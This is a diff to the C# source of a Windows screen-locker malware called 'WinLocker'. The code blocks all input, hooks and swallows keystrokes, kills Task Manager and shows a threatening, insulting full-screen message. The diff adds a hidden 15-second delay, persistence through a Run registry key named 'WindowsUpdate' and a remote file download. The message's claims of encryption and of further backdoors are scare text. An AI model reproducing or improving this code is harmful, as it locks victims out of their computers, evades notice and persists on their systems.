@@ -1,13 +1,15 @@
 using System;
 using System.Diagnostics;
 using System.Drawing;
+using System.IO;
+using System.Media;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Threading;
 using System.Windows.Forms;
 
 public class WinLocker : Form
 {
-    // ============ WinAPI для блокировки ============
     [DllImport("user32.dll")]
     private static extern bool BlockInput(bool fBlockIt);
 
@@ -19,8 +21,6 @@ public class WinLocker : Form
 
     private delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-    // ============ Поля формы ============
-    private Label lblTitle;
     private Label lblScaryLeft;
     private Label lblDedsekRight;
     private Label lblPassword;
@@ -30,10 +30,11 @@ public class WinLocker : Form
     private const string PASSWORD = "1601";
     private const int WH_KEYBOARD_LL = 13;
     private IntPtr _hookID = IntPtr.Zero;
+    private SoundPlayer player;
+    private System.Windows.Forms.Timer bootTimer;
 
     public WinLocker()
     {
-        // Настройки окна
         this.WindowState = FormWindowState.Maximized;
         this.FormBorderStyle = FormBorderStyle.None;
         this.TopMost = true;
@@ -41,18 +42,19 @@ public class WinLocker : Form
         this.StartPosition = FormStartPosition.Manual;
         this.Location = new Point(0, 0);
         this.Size = Screen.PrimaryScreen.Bounds.Size;
+        this.ShowInTaskbar = false;
+        this.Opacity = 0;
 
-        // ====== СТРАШНЫЙ ТЕКСТ СЛЕВА ======
         lblScaryLeft = new Label
         {
-            Text = "ВАШИ ДАННЫЕ ЗАШИФРОВАНЫ\n" +
-                   "ПЕРЕЗАГРУЗКА ИЛИ ВЫКЛЮЧЕНИЕ ПК = СНОС WINDOWS\n" +
-                   "ПАРОЛЬ ТЫ НИКОГДА НЕ УЗНАЕШЬ\n" +
-                   "СОСИ ХУЙ\n\n" +
-                   "НО Я НЕ ВЫМОГАТЕЛЬ, Я ДАМ ТЕБЕ ПАРОЛЬ\n" +
-                   "НО НЕ ПРОСТО ПАРОЛЬ, ТЫ ЕГО ДОЛЖЕН РАСШИФРОВАТЬ\n" +
-                   "1 - 5 ПАРОЛИ ВСЕ РАЗНЫЕ СЕТИ\n" +
-                   "МУЧАЙСЯ ПИДОР\n\n" +
+            Text = "YOUR DATA IS ENCRYPTED\n" +
+                   "REBOOT OR SHUTDOWN = WINDOWS DESTROYED\n" +
+                   "YOU WILL NEVER KNOW THE PASSWORD\n" +
+                   "SUCK IT\n\n" +
+                   "BUT I'M NOT A BLACKMAILER, I WILL GIVE YOU A PASSWORD\n" +
+                   "BUT NOT JUST A PASSWORD, YOU MUST DECRYPT IT\n" +
+                   "1 - 5 PASSWORDS ARE ALL DIFFERENT NETWORKS\n" +
+                   "SUFFER, IDIOT\n\n" +
                    "1. standard DES\n$1$rjBkQ1jG$TTNuUVgVfun06nsscdMUV1\n" +
                    "2. Bcrypt\n$2y$10$XkyocAmlL3rdiz1Uj72MkOpqd.CHCajedThCzis6AL.62OH8lDr/y\n" +
                    "3. SHA1\n24b378e0bfaf950a0b97c7d36f2d65301286dcf6\n" +
@@ -66,19 +68,18 @@ public class WinLocker : Form
         };
         this.Controls.Add(lblScaryLeft);
 
-        // ====== ТЕКСТ DEDSEK СПРАВА ======
         lblDedsekRight = new Label
         {
-            Text = "DeDsEk тебя приветствует\n" +
-                   "не надо было ничего скачивать\n" +
-                   "из непроверенных источников\n\n" +
-                   "DEDSEK тебя видит\n\n" +
-                   "кстати это еще не один вирус\n" +
-                   "у тебя от меня есть:\n" +
-                   "- Бекдор\n" +
-                   "- Ботнет\n" +
-                   "- Руткит\n" +
-                   "- Червяк такой жирный",
+            Text = "DEDSEK DOES NOT FORGIVE\n" +
+                   "YOU SHOULD NOT HAVE DOWNLOADED ANYTHING\n" +
+                   "FROM UNTRUSTED SOURCES\n\n" +
+                   "DEDSEK SEES YOU\n\n" +
+                   "BY THE WAY, THIS IS NOT THE ONLY VIRUS\n" +
+                   "YOU HAVE FROM ME:\n" +
+                   "- BACKDOOR\n" +
+                   "- BOTNET\n" +
+                   "- ROOTKIT\n" +
+                   "- FAT WORM",
             ForeColor = Color.White,
             BackColor = Color.Black,
             Font = new Font("Courier New", 14),
@@ -88,10 +89,9 @@ public class WinLocker : Form
         };
         this.Controls.Add(lblDedsekRight);
 
-        // ====== ФОРМА ВВОДА ПАРОЛЯ (по центру внизу) ======
         lblPassword = new Label
         {
-            Text = "ВВЕДИТЕ ПАРОЛЬ:",
+            Text = "ENTER PASSWORD:",
             ForeColor = Color.White,
             BackColor = Color.Black,
             Font = new Font("Courier New", 24),
@@ -122,34 +122,74 @@ public class WinLocker : Form
         };
         this.Controls.Add(lblStatus);
 
-        txtPassword.KeyDown += TxtPassword_KeyDown;
+        // Таймер для анимации (15 секунд)
+        bootTimer = new System.Windows.Forms.Timer();
+        bootTimer.Interval = 15000;
+        bootTimer.Tick += BootTimer_Tick;
+        bootTimer.Start();
 
-        // Запускаем убийцу Диспетчера задач
+        // Вместо обработки клавиш просто разрешаем ввод в TextBox
+        this.KeyPreview = true;
+        this.KeyDown += (sender, e) => {
+            if (e.KeyCode == Keys.Enter)
+            {
+                if (txtPassword.Text == PASSWORD)
+                {
+                    BlockInput(false);
+                    if (player != null)
+                        player.Stop();
+                    Application.Exit();
+                }
+                else
+                {
+                    lblStatus.Text = "WRONG PASSWORD!";
+                    txtPassword.Clear();
+                }
+            }
+        };
+
         new Thread(KillTaskmgr).Start();
+        AddToStartup();
     }
 
-    private void TxtPassword_KeyDown(object sender, KeyEventArgs e)
+    private void BootTimer_Tick(object sender, EventArgs e)
     {
-        if (e.KeyCode == Keys.Enter)
-        {
-            if (txtPassword.Text == PASSWORD)
-            {
-                BlockInput(false);
-                Application.Exit();
-            }
-            else
-            {
-                lblStatus.Text = "НЕВЕРНЫЙ ПАРОЛЬ!";
-                txtPassword.Clear();
-            }
-        }
-    }
-
-    protected override void OnLoad(EventArgs e)
-    {
+        bootTimer.Stop();
+        this.Opacity = 1;
         BlockInput(true);
         SetHook();
-        base.OnLoad(e);
+        DownloadAndPlayMusic();
+    }
+
+    private void AddToStartup()
+    {
+        try
+        {
+            Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+            key.SetValue("WindowsUpdate", Application.ExecutablePath);
+        }
+        catch { }
+    }
+
+    private void DownloadAndPlayMusic()
+    {
+        try
+        {
+            string musicUrl = "https://raw.githubusercontent.com/ippo123459-bit/winlocker/main/music.mp3";
+            string tempPath = Path.GetTempPath() + "wd2_theme.mp3";
+
+            if (!File.Exists(tempPath))
+            {
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadFile(musicUrl, tempPath);
+                }
+            }
+
+            player = new SoundPlayer(tempPath);
+            player.PlayLooping();
+        }
+        catch { }
     }
 
     protected override void OnFormClosing(FormClosingEventArgs e)
@@ -169,7 +209,7 @@ public class WinLocker : Form
 
     private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
     {
-        return (IntPtr)1; // Блокируем всё
+        return (IntPtr)1;
     }
 
     private static void KillTaskmgr()
